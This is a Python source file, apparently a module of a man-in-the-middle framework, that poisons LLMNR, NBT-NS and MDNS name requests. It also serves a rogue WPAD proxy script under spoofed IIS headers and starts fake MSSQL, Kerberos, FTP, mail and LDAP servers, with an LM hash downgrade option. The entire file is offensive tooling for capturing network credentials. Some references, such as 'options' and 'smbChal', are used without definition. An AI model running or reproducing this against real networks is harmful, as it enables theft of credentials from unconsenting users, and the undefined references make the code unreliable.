from modules.module import Module
from core.utils import iptables
from core.responder.llmnr.LLMNRPoisoner import LLMNRPoisoner
from core.responder.mdns.MDNSPoisoner import MDNSPoisoner
from core.responder.nbtns.NBTNSPoisoner import NBTNSPoisoner
from core.responder.fingerprinter.LANFingerprinter import LANFingerprinter

class Responder(Module):
    name = 'Responder'
    optname = 'responder'
    desc = 'Poison LLMNR, NBT-NS and MDNS requests'
    version = '0.2'

    def initialize(self, context):
        Module.initialize(self, context)

        LANFingerprinter().start(options)
        MDNSPoisoner().start(self.options, context.ip)
        NBTNSPoisoner().start(self.options, context.ip)
        LLMNRPoisoner().start(self.options, context.ip)

        if context.wpad:
            iptables().wpad(context.tport)
            from core.servers.http.HTTPserver import HTTPserver
            import flask

            server = HTTPserver.getInstance().server

            @server.route('/<wpad_req>')
            def wpad(wpad_req):
                if (wpad_req == 'wpad.dat') or (wpad_req.endswith('.pac')):
                    payload = self.config['Responder']['WPADScript']

                    resp = flask.Response(payload)
                    resp.headers['Server'] = "Microsoft-IIS/6.0"
                    resp.headers['Content-Type'] = "application/x-ns-proxy-autoconfig"
                    resp.headers['X-Powered-By'] = "ASP.NET"
                    resp.headers['Content-Length'] = len(payload)

                    return resp

        if self.config["Responder"]["MSSQL"].lower() == "on":
            from core.responder.mssql.MSSQLServer import MSSQLServer
            MSSQLServer().start(smbChal)

        if self.config["Responder"]["Kerberos"].lower() == "on":
            from core.responder.kerberos.KERBServer import KERBServer
            KERBServer().start()

        if self.config["Responder"]["FTP"].lower() == "on":
            from core.responder.ftp.FTPServer import FTPServer
            FTPServer().start()

        if self.config["Responder"]["POP"].lower() == "on":
            from core.responder.pop3.POP3Server import POP3Server
            POP3Server().start()

        if self.config["Responder"]["SMTP"].lower() == "on":
            from core.responder.smtp.SMTPServer import SMTPServer
            SMTPServer().start()

        if self.config["Responder"]["IMAP"].lower() == "on":
            from core.responder.imap.IMAPServer import IMAPServer
            IMAPServer().start()

        if self.config["Responder"]["LDAP"].lower() == "on":
            from core.responder.ldap.LDAPServer import LDAPServer
            LDAPServer().start(smbChal)

        if options.analyze:
            self.tree_info.append("Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned")
            self.IsICMPRedirectPlausible(self.ourip)

    def options(self, options):
        options.add_argument('--analyze', dest="analyze", action="store_true", help="Allows you to see NBT-NS, BROWSER, LLMNR requests from which workstation to which workstation without poisoning")
        options.add_argument('--wredir', dest="wredir", action="store_true", help="Enables answers for netbios wredir suffix queries")
        options.add_argument('--nbtns', dest="nbtns", action="store_true", help="Enables answers for netbios domain suffix queries")
        options.add_argument('--fingerprint', dest="finger", action="store_true", help = "Fingerprint hosts that issued an NBT-NS or LLMNR query")
        options.add_argument('--lm', dest="lm", action="store_true", help="Force LM hashing downgrade for Windows XP/2003 and earlier")
        options.add_argument('--wpad', dest="wpad", action="store_true", help = "Start the WPAD rogue proxy server")
        # Removed these options until I find a better way of implementing them
        #options.add_argument('--forcewpadauth', dest="forceWpadAuth", default=False, action="store_true", help = "Set this if you want to force NTLM/Basic authentication on wpad.dat file retrieval. This might cause a login prompt in some specific cases. Therefore, default value is False")
        #options.add_argument('--basic', dest="basic", default=False, action="store_true", help="Set this if you want to return a Basic HTTP authentication. If not set, an NTLM authentication will be returned")
